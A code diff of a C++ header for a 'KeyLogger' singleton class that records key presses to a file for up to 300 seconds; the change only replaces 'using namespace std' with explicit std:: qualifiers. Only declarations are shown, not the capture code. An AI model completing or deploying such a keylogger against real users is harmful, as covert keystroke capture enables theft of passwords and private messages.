@@ -6,8 +6,6 @@
 #include <time.h>
 #include <atomic>
 
-using namespace std;
-
 #define KL_PRESSED	1
 
 #define KL_WAITING 0
@@ -16,26 +14,26 @@ using namespace std;
 
 class KeyLogger {
 	private:
-		string file_name;
-		static unordered_map<int, string> vkey;
-		bool getSpecialKey(int key, string& key_name);
+		std::string file_name;
+		static std::unordered_map<int, std::string> vkey;
+		bool getSpecialKey(int key, std::string& key_name);
 		void keylog();
-		atomic<bool> running;
+		std::atomic<bool> running;
 		const int max_running_time = 300;
-		atomic<int> status;
+		std::atomic<int> status;
 
 		// for singleton
 		KeyLogger() = delete;
-		KeyLogger(const string& file_name) : file_name(file_name), status(KL_WAITING), running(false) {}
+		KeyLogger(const std::string& file_name) : file_name(file_name), status(KL_WAITING), running(false) {}
 		KeyLogger(const KeyLogger& kl) = delete;
 		KeyLogger& operator=(const KeyLogger& kl) = delete;
 		static KeyLogger* instance;
 
 	public:
-		static KeyLogger* getInstance(const string& file_name = "");
+		static KeyLogger* getInstance(const std::string& file_name = "");
 		static void deleteInstance();
 		void start() {running = true; keylog();}
 		void stop() {running = false;}
-		string getOutputFile();
+		std::string getOutputFile();
 		int getStatus();
 };
